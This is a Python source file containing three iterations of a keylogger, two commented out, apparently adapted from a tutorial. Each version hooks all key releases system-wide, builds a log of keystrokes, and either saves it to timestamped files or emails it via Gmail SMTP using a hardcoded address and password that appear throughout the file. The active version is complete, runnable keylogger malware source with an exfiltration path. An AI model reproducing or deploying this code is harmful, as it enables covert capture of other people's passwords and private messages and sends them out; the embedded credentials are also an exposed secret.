# # # import keyboard 
# # # import smtplib 
# # # from threading import Semaphore, Timer

# # # SEND_REPORT_EVERY = 20 
# # # EMAIL_ADDRESS = "idf819425@gmail.com"
# # # EMAIL_PASSWORD = "ombanna!@#7773"

# # # class keylogger:
# # #     def __init__(self,interval):
# # #        self.interval = interval 
# # #        self.log t = ""

# # #        self.semaphore = Semaphore(0)

# # #     def callback(self,event):
# # #         """
# # #         tthis callback is invoked whenever a keyboard event is occured (i.e when a kry is released in this example )
# # #         """
# # #         name = event.name
# # #         if len(name)> 1:
# # #             if name == "space":
# # #                 name = " "
# # #             elif name == "enter":
# # #                 name ="[ENTER]\n" 
# # #             elif name == "decimal":
# # #                 name = "."
# # #             else:
# # #                 name = name.replace(" ","_")
# # #                 name = f"[{name.upper()}]"

# # #         self.log += name 

# # #     def sendmail(self, email, password, message):
# # #         server= smtplib.SMTP(host="smtp.gmail.com",port=587)
# # #         server.starttls()
# # #         server.login(email,password)
# # #         server.sendmail(email, email, message)
# # #         server.quit()

# # #     def report(self):
# # #         """
# # #         this function gets called every 'self.interval'
# # #         it basically sends keylogs and resets 'self.log' variable"""
# # #         if self.log:
# # #             print(self.log)
# # #         self.log = ""
# # #         Timer(interval=self.interval, function=self.report).start()
    
# # #     def start(self):
# # #         keyboard.on_release(callback=self.callback)
# # #         self.report()

# # #         self.semaphore.acquire()
    

# # # if __name__ == "__main__":
# # #     keylogger = keylogger(interval=SEND_REPORT_EVERY)
# # #     keylogger.start()












# # import keyboard
# # import smtplib
# # from threading import Semaphore, Timer
# # from datetime import datetime


# # SEND_REPORT_EVERY = 60
# # EMAIL_ADDRESS = "idf819425@gmail.com"
# # EMAIL_PASSWORD = "ombanna!@#7773"


# # class Keylogger:
# #     def __init__(self, interval, report_method="email"):
# #         self.interval = interval
# #         self.report_method = report_method
# #         self.log = ""
# #         # for blocking after setting the on_release listener
# #         self.start_dt = datetime.now()
# #         self.end_dt = datetime.now()

# #     def callback(self, event):
# #         """
# #         This callback is invoked whenever a keyboard event is occured
# #         (i.e when a key is released in this example)
# #         """
# #         name = event.name
# #         if len(name) > 1:
# #             # not a character, special key (e.g ctrl, alt, etc.)
# #             # uppercase with []
# #             if name == "space":
# #                 name = " "
# #             elif name == "enter":
# #                 name = "[ENTER]\n"
# #             elif name == "decimal":
# #                 name = "."
# #             else:
# #                 name = name.replace(" ", "_")
# #                 name = f"[{name.upper()}]"

# #         self.log += name


# #     def update_filename(self):
# #         # construct the filename to be identified by start & end datetimes
# #         start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
# #         end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
# #         self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

# #     def report_to_file(self):
# #         """This method creates a log file in the current directory that contains
# #         the current keylogs in the `self.log` variable"""
# #         # open the file in write mode (create it)
# #         with open(f"{self.filename}.txt", "w") as f:
# #             # write the keylogs to the file
# #             print(self.log, file=f)
# #         print(f"[+] Saved {self.filename}.txt")

# #     def sendmail(self, email, password, message):
# #         server = smtplib.SMTP(host="smtp.gmail.com", port=587)
# #         server.starttls()
# #         server.login(email, password)
# #         server.sendmail(email, email, message)
# #         server.quit()

# #     def report(self):
# #         """
# #         This function gets called every `self.interval`
# #         It basically sends keylogs and resets `self.log` variable
# #         """
# #         if self.log:
# #             # if there is something in log, report it
# #             self.end_dt = datetime.now()
# #             # update `self.filename`
# #             self.update_filename()
# #             if self.report_method == "email":
# #                 self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
# #             elif self.report_method == "file":
# #                 self.report_to_file()
# #             # if you want to print in the console, uncomment below line
# #             # print(f"[{self.filename}] - {self.log}")
# #             self.start_dt = datetime.now()
# #         self.log = ""
# #         timer = Timer(interval=self.interval, function=self.report)
# #         # set the thread as daemon (dies when main thread die)
# #         timer.daemon = True
# #         # start the timer
# #         timer.start()

        

# #     def start(self):
# #         # record the start datetime
# #         self.start_dt = datetime.now()
# #         # start the keylogger
# #         keyboard.on_release(callback=self.callback)
# #         # start reporting the keylogs
# #         self.report()
# #         # block the current thread, wait until CTRL+C is pressed
# #         keyboard.wait()

# # if __name__ == "__main__":
# #     keylogger = Keylogger(interval=SEND_REPORT_EVERY,report_method="file")
# #     keylogger.start()


















import keyboard # for keylogs
import smtplib # for sending email using SMTP protocol (gmail)
# Timer is to make a method runs after an `interval` amount of time
from threading import Timer
from datetime import datetime

SEND_REPORT_EVERY = 20 # in seconds, 60 means 1 minute and so on
EMAIL_ADDRESS = "idf819425@gmail.com"
EMAIL_PASSWORD = "ombanna!@#7773"

class Keylogger:
    def __init__(self, interval, report_method="email"):
        # we gonna pass SEND_REPORT_EVERY to interval
        self.interval = interval
        self.report_method = report_method
        # this is the string variable that contains the log of all 
        # the keystrokes within `self.interval`
        self.log = ""
        # record start & end datetimes
        self.start_dt = datetime.now()
        self.end_dt = datetime.now()

    def callback(self, event):
        """
        This callback is invoked whenever a keyboard event is occured
        (i.e when a key is released in this example)
        """
        name = event.name
        if len(name) > 1:
            # not a character, special key (e.g ctrl, alt, etc.)
            # uppercase with []
            if name == "space":
                # " " instead of "space"
                name = " "
            elif name == "enter":
                # add a new line whenever an ENTER is pressed
                name = "[ENTER]\n"
            elif name == "decimal":
                name = "."
            else:
                # replace spaces with underscores
                name = name.replace(" ", "_")
                name = f"[{name.upper()}]"
        # finally, add the key name to our global `self.log` variable
        self.log += name
    
    def update_filename(self):
        # construct the filename to be identified by start & end datetimes
        start_dt_str = str(self.start_dt)[:-7].replace(" ", "-").replace(":", "")
        end_dt_str = str(self.end_dt)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{start_dt_str}_{end_dt_str}"

    def report_to_file(self):
        """This method creates a log file in the current directory that contains
        the current keylogs in the `self.log` variable"""
        # open the file in write mode (create it)
        with open(f"{self.filename}.txt", "w") as f:
            # write the keylogs to the file
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")

    def sendmail(self, email, password, message):
        # manages a connection to an SMTP server
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        # connect to the SMTP server as TLS mode ( for security )
        server.starttls()
        # login to the email account
        server.ehlo()
        server.login(email, password)
        print("login successful")
        # send the actual message
        server.sendmail(email, email, message)
        # terminates the session
        server.quit()







    def report(self):
        """
        This function gets called every `self.interval`
        It basically sends keylogs and resets `self.log` variable
        """
        if self.log:
            # if there is something in log, report it
            self.end_dt = datetime.now()
            # update `self.filename`
            self.update_filename()
            if self.report_method == "email":
                self.sendmail(EMAIL_ADDRESS, EMAIL_PASSWORD, self.log)
            elif self.report_method == "file":
                self.report_to_file()
            # if you want to print in the console, uncomment below line
            # print(f"[{self.filename}] - {self.log}")
            self.start_dt = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        # set the thread as daemon (dies when main thread die)
        timer.daemon = True
        # start the timer
        timer.start()

    def start(self):
        # record the start datetime
        self.start_dt = datetime.now()
        # start the keylogger
        keyboard.on_release(callback=self.callback)
        # start reporting the keylogs
        self.report()
        # block the current thread, wait until CTRL+C is pressed
        keyboard.wait()

    
if __name__ == "__main__":
    # if you want a keylogger to send to your email
    # keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="email")
    # if you want a keylogger to record keylogs to a local file 
    # (and then send it using your favorite method)
    keylogger = Keylogger(interval=SEND_REPORT_EVERY, report_method="file")
    keylogger.start()



















